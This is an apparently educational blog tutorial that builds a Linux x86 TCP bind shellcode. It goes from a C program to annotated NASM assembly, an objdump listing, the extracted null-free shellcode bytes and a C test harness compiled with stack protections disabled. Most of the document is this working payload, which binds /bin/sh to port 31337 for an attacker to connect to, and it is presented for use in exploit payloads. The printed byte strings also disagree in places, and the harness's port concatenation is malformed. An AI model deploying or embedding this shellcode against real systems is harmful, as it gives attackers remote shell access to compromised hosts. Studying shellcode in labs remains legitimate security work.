## TCP Bind Shellcode

A Linux x86 assembly language program to enable a tcp connection to bind to a shell on a compromised host. The compromised system will open a socket and bind a shell to the port, this will allow an attacker to connect to the system via the port and issue shell commands.

To build anything you normally need a foundation, this one being a working C language program that will do what is required. From this code it is possible to then work backwards, refining and optimising the code on the way. Comments are added to enable more complete cross referencing while reading between the differing code implementations, though the code should be fairly self explanatory. The assembly language snippets where taken, and altered slightly, from a disassembly of the binary using objdump, e.g.

*$ objdump -d tcpbindshellc -M intel*

Output has not been reproduced due to length and the usefulness of wasting blog space.

Note:
Socket code is among the most standard of code to be found on the internet and it seldom differs, I would be loathe to claim all code in this post as my own as it is based off research and examples found in places too numerous to mention, my feet are most definitely planted on the shoulders of giants.
```c
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
 
int
main(void) 
{
    int sockfd, dupsockfd;  
    struct sockaddr_in hostaddr, clientaddr;   
    socklen_t sinsz;
     
    /*
    push ecx        ; push null
    push byte 0x6   ; push IPPROTO_TCP value
    push byte 0x1   ; push SOCK_STREAM value
    push byte 0x2   ; push AF_INET
    mov ecx, esp    ; ecx contains pointer to socket() args
    int 0x80        ; make the call, eax contains sockfd                       
    mov esi, eax    ; esi now contains sockfd
    */
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
 
    /*  
    push edx        ; push null
    push word 0x697a ; push port number 31337      
    push word bx    ; push AF_INET
    mov ecx, esp    ; ecx contains pointner to sockaddr struct
    push byte 0x10  ; push sinsz
    push ecx        ; push hostaddr
    push esi        ; push sockfd
    mov ecx, esp    ; ecx contains pointer to bind() args
    int 0x80
    */
    hostaddr.sin_family = AF_INET;         
    hostaddr.sin_port = htons(31337);      
    hostaddr.sin_addr.s_addr = INADDR_ANY; 
    memset(&(hostaddr.sin_zero), '\0', 8); 
    bind(sockfd, (struct sockaddr *)&hostaddr, 
        sizeof(struct sockaddr));
     
    /*
    push byte 0x1   ; push backlog
    push esi        ; push sockfd
    mov ecx, esp    ; ecx contains pointer to listen() args
    int 0x80    ; make the call               
    */
    listen(sockfd, 1);
     
    /*
    push edx        ; push sinsz
    push edx        ; push clientaddr 
    push esi        ; push sockfd
    mov ecx, esp    ; ecx contains pointer to accept() args
    int 0x80    ; make the call
    */
    sinsz = sizeof(struct sockaddr_in);
    dupsockfd = accept(sockfd, 
        (struct sockaddr *)&clientaddr, &sinsz);
 
    /*
    mov ebx, eax    ; ebx contains dupsockfd
    xor ecx, ecx    ; zero ecx register
    mov cl, 0x3     ; set counter
    dupfd:
    dec cl          ; decrement counter
    mov al, 0x3f    ; dup2()
    int 0x80        ; make the call
    jne dupfd       ; loop until 0
    */
    dup2(dupsockfd,0); // stdin
    dup2(dupsockfd,1); // stdout
    dup2(dupsockfd,2); // stderr
 
    /*
    push edx        ; push null
    push 0x68732f6e ; hs/n
    push 0x69622f2f ; ib//
    mov ebx, esp    ; ebx contains address of //bin/sh
    push edx        ; push null
    push ebx        ; push address of //bin/sh
    mov ecx, esp    ; ecx pointer to //bin/sh
    push edx        ; push null
    mov edx, esp    ; edx contains pointer to null
    mov al, 0xb     ; execve()
    int 0x80    ; make the call
    */
    execve("/bin/sh", NULL, NULL);
}
```
Build the code:
```
$ gcc tcpbindshellc.c -o tcpbindshellc
```
Test above executable on localhost using netcat under X:
Open a terminal under working directory,
```
$ ./tcpbindshellc
```
Open another terminal,
```
$ nc localhost 31337
```
commands can now be executed in this terminal e.g. try typing ls to see contents of tcpbindshell directory.

Using the above C program as a reference it is easier to work out what is required in the development of an assembly language equivalnet. Therefore the following program is written, from the disassembly of the C binary, to allow for use as shellcode within a exploit payload. To this end the shellcode produced is free from NULLs and is as compact as possible, or at least as compact as I can make it, for now. Extensive comments have been added to the assembly language code for study purposes.
```nasm
global _start
section .text
_start:
    ; Socket
    ; Function prototype:
    ;   int socket(int domain, int type, int protocol)
    ; Purpose:
    ;   creates an endpoint for communications, returns a
    ;   descriptor that will be used thoughout the code to
    ;   bind/listen/accept communications
    xor eax, eax    ; zero eax register
    xor ebx, ebx    ; zero ebx register
    xor ecx, ecx    ; zero ecx register
    xor edx, edx    ; zero edx register
    mov al, 0x66    ; socketcall()
    mov bl, 0x1     ; socket() call number for socketcall
    push ecx        ; push null
    push byte 0x6   ; push IPPROTO_TCP value
    push byte 0x1   ; push SOCK_STREAM value
    push byte 0x2   ; push AF_INET
    mov ecx, esp    ; ecx contains pointer to socket() args
    int 0x80
    mov esi, eax    ; esi contains socket file descriptor
 
    ; Bind
    ; Function prototype:
    ;   int bind(int sockfd, const struct sockaddr *addr,
    ;     socklen_t addrlen)
    ; Purpose:
    ;   assigns the addess in addr to the socket descriptor,
    ;   basically "giving a name to a socket"
    mov al, 0x66        ; socketcall()
    mov bl, 0x2         ; bind() call number for socketcall
    push edx            ; push null
    push word 0x697a    ; push port number 31337
    push word bx        ; push AF_INET
    mov ecx, esp        ; ecx contains pointer to sockaddr struct
    push byte 0x10      ; push socklen_t addrlen
    push ecx            ; push const struct sockaddr *addr
    push esi            ; push socket file descriptor
    mov ecx, esp        ; ecx contains pointer to bind() args
    int 0x80
 
    ; Listen
    ; Function prototype:
    ;   int listen(int sockfd, int backlog)
    ; Purpose:
    ;   Prepares the socket referenced in the descriptor for
    ;   accepting incoming communications
    mov al, 0x66    ; socketcall()
    mov bl, 0x4     ; listen() call number for socketcall
    push byte 0x1   ; push int backlog
    push esi        ; push socket file descriptor
    mov ecx, esp    ; ecx contains pointer to listen() args
    int 0x80
 
    ; Accept
    ; Function prototype:
    ;   int accept(int sockfd, struct sockaddr *addr,
    ;     socklen_t *addrlen)
    ; Purpose:
    ;   accepts a connection on a socket and returns a new
    ;   file descriptor referring to the socket which is used
    ;   to bind stdin, stdout and stderr to the local terminal
    mov al, 0x66    ; socketcall()
    mov bl, 0x5     ; accept() call number for socketcall
    push edx        ; push socklen_t * addrlen
    push edx        ; push struct sockaddr *addr
    push esi        ; push socket file descriptor
    mov ecx, esp    ; ecx contains pointer to accept() args
    int 0x80
 
    ; Dup2
    ; Function prototype:
    ;   int dup2(int oldfd, int newfd)
    ; Purpose:
    ;   duplicate a file descriptor, copies the old file
    ;   descriptor to a new one allowing them to be used
    ;   interchangably, this allows all shell ops to/from the
    ;   compomised system
    mov ebx, eax    ; ebx contains descriptor of accepted socket
    xor ecx, ecx    ; zero ecx register
    mov cl, 0x3     ; set counter
dupfd:
    dec cl          ; decrement counter
    mov al, 0x3f    ; dup2()
    int 0x80
    jne dupfd       ; loop until 0
 
    ; Execve
    ; Function descriptor:
    ;   int execve(const char *fn, char *const argv[],
    ;     char *const envp[])
    ; Purpose:
    ;   to execute a program on a remote and/or compromised
    ;   system. There is no return from using execve therefore
    ;   an exit syscall is not required
    xor eax, eax       ; zero eax register
    push edx           ; push null
    push 0x68732f6e    ; hs/n
    push 0x69622f2f    ; ib//
    mov ebx, esp       ; ebx contains address of //bin/sh
    push edx           ; push null
    push ebx           ; push address of //bin/sh
    mov ecx, esp       ; ecx pointer to //bin/sh
    push edx           ; push null
    mov edx, esp       ; edx contains pointer to null
    mov al, 0xb        ; execve()
    int 0x80
```
Build the code:
```
$ nasm -felf32 -o tcpbindshell.o tcpbinshell.asm
$ ld -o tcpbindshell tcpbindshell.o
```
Check for nulls:
```
$ objdump -D tcpbindshell -M intel
	
tcpbindshell:     file format elf32-i386
Disassembly of section .text:
08048060 <_start>:
 8048060:   31 c0                   xor    eax,eax
 8048062:   31 db                   xor    ebx,ebx
 8048064:   31 c9                   xor    ecx,ecx
 8048066:   31 d2                   xor    edx,edx
 8048068:   b0 66                   mov    al,0x66
 804806a:   b3 01                   mov    bl,0x1
 804806c:   51                      push   ecx
 804806d:   6a 06                   push   0x6
 804806f:   6a 01                   push   0x1
 8048071:   6a 02                   push   0x2
 8048073:   89 e1                   mov    ecx,esp
 8048075:   cd 80                   int    0x80
 8048077:   89 c6                   mov    esi,eax
 8048079:   b0 66                   mov    al,0x66
 804807b:   b3 02                   mov    bl,0x2
 804807d:   52                      push   edx
 804807e:   66 68 7a 69             pushw  0x697a
 8048082:   66 53                   push   bx
 8048084:   89 e1                   mov    ecx,esp
 8048086:   6a 10                   push   0x10
 8048088:   51                      push   ecx
 8048089:   56                      push   esi
 804808a:   89 e1                   mov    ecx,esp
 804808c:   cd 80                   int    0x80
 804808e:   b0 66                   mov    al,0x66
 8048090:   b3 04                   mov    bl,0x4
 8048092:   6a 01                   push   0x1
 8048094:   56                      push   esi
 8048095:   89 e1                   mov    ecx,esp
 8048097:   cd 80                   int    0x80
 8048099:   b0 66                   mov    al,0x66
 804809b:   b3 05                   mov    bl,0x5
 804809d:   52                      push   edx
 804809e:   52                      push   edx
 804809f:   56                      push   esi
 80480a0:   89 e1                   mov    ecx,esp
 80480a2:   cd 80                   int    0x80
 80480a4:   89 c3                   mov    ebx,eax
 80480a6:   31 c9                   xor    ecx,ecx
 80480a8:   b1 03                   mov    cl,0x3
080480aa :
 80480aa:   fe c9                   dec    cl
 80480ac:   b0 3f                   mov    al,0x3f
 80480ae:   cd 80                   int    0x80
 80480b0:   75 f8                   jne    80480aa
 80480b2:   31 c0                   xor    eax,eax
 80480b4:   52                      push   edx
 80480b5:   68 6e 2f 73 68          push   0x68732f6e
 80480ba:   68 2f 2f 62 69          push   0x69622f2f
 80480bf:   89 e3                   mov    ebx,esp
 80480c1:   52                      push   edx
 80480c2:   53                      push   ebx
 80480c3:   89 e1                   mov    ecx,esp
 80480c5:   52                      push   edx
 80480c6:   89 e2                   mov    edx,esp
 80480c8:   b0 0b                   mov    al,0xb
 80480ca:   cd 80                   int    0x80
```
Test above executable on localhost using netcat under X:
Open a terminal under working directory,
```
$ ./tcpbindshell
```
Open another terminal,
```
$ nc localhost 31337
```
commands can now be executed in this terminal e.g. try typing ls to see contents of tcpbindshell directory.

Get shellcode from executable:
Use the following from the commandlinefu website replacing PROGRAM with the name of the required executable like so
```bash
$ objdump -d ./tcpbindshell | grep ‘[0-9a-f]:’ | grep -v ‘file’ | cut -f2 -d: | cut -f1-6 -d’ ‘ | tr -s ‘ ‘ | tr ‘t’ ‘ ‘ | sed ‘s/ $//g’ | sed ‘s/ /x/g’ | paste -d ” -s | sed ‘s/^/”/’ | sed ‘s/$/”/g’

“\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x51\x6a\x06\x6\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\xb3\x02\x52\x66\x68\x7a\x69\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x6a\x01\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x52\x56\x89\xe1\xcd\x80\x89\xc3\x31\xc9\xb1\x03\xfe\xc9\xb0\x3f\xcd\x80\x75\xf8\x31\xc0\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x52\x89\xe2\xb0\x0b\xcd\x80”
```
The shellcode can be copied and pasted into a test program, similar to the one below. The #define PORTHL is to allow for an easily configurable port.
```c	
#include <stdio.h>
 
/*
 Port High/Low bytes
 Current port 31337 (7a69)
*/
#define PORTHL "\x7a\x69"
 
unsigned char code[] =
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66"
"\xb3\x01\x51\x6a\x06\x6a\x01\x6a\x02\x89"
"\xe1\xcd\x80\x89\xc6\xb0\x66\xb3\x02\x52"
"\x66\x68 
"PORTHL"
\x66\x53\x89\xe1\x6a\x10"
"\x51\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x04"
"\x6a\x01\x56\x89\xe1\xcd\x80\xb0\x66\xb3"
"\x05\x52\x52\x56\x89\xe1\xcd\x80\x89\xc3"
"\x31\xc9\xb1\x03\xfe\xc9\xb0\x3f\xcd\x80"
"\x75\xf8\x31\xc0\x52\x68\x6e\x2f\x73\x68"
"\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89"
"\xe1\x52\x89\xe2\xb0\x0b\xcd\x80";
 
main()
{
    printf("Shellcode Length: %dn", sizeof(code)-1);
    int (*ret)() = (int(*)())code;
    ret();
}
```
Build the code:
```
$ gcc -fno-stack-protector -z execstack -o shellcode shellcode.c
```
The options for gcc are to disable stack protection and enable stack execution respectively. Without these options the code will cause a segfault.

Test above executable on localhost using netcat under X:
Open a terminal under working directory,
```
$ ./shellcode
```
Open another terminal,
```
$ nc localhost 31337
```
commands can now be executed in this terminal e.g. try typing ls to see contents of shellcode directory.

The shellcode above currently weighs in at 108 bytes. I feel that with further research the codebase could possibly be reduced, especially on architectures other than x86.


Shell-storm database entry -- http://shell-storm.org/shellcode/files/shellcode-847.php
